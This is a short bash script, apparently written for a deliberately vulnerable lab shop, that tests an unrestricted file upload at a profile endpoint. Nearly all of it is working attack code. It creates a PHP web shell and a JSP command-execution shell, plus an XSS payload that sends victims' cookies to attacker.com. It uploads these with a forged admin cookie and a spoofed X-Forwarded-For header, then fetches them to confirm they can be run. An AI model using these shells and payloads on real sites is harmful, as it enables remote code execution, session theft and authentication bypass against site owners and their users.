#!/bin/bash
# Unrestricted File Upload Test Script
# Target: VULN SHOP Profile Upload

TARGET="http://10.210.136.53:3000"
MY_IP="10.0.0.101"

echo "[*] Unrestricted File Upload Test"
echo "[*] Target: $TARGET/profile/upload"
echo ""

# Create test files
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
echo '<script>document.location="http://attacker.com/steal?c="+document.cookie</script>' > /tmp/xss.html
echo '<%@ page import="java.io.*" %><% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' > /tmp/shell.jsp

files=("/tmp/shell.php" "/tmp/xss.html" "/tmp/shell.jsp")

for file in "${files[@]}"; do
    filename=$(basename "$file")
    echo "[*] Uploading: $filename"

    response=$(curl -s -H "X-Forwarded-For: $MY_IP" \
        -H "Cookie: user=admin; isAdmin=true; user_id=1" \
        -F "profile_image=@$file" \
        "$TARGET/profile/upload" -i 2>&1)

    if echo "$response" | grep -q "200"; then
        echo "[+] Upload successful"

        # Try to access uploaded file
        echo "[*] Accessing: $TARGET/uploads/$filename"
        uploaded=$(curl -s -H "X-Forwarded-For: $MY_IP" "$TARGET/uploads/$filename" 2>&1)

        if [ -n "$uploaded" ] && [ "$uploaded" != *"Cannot GET"* ]; then
            echo "[+] File accessible!"
            echo "Content: ${uploaded:0:100}..."
        fi
    else
        echo "[-] Upload failed"
    fi
    echo ""
done

# Cleanup
rm -f /tmp/shell.php /tmp/xss.html /tmp/shell.jsp
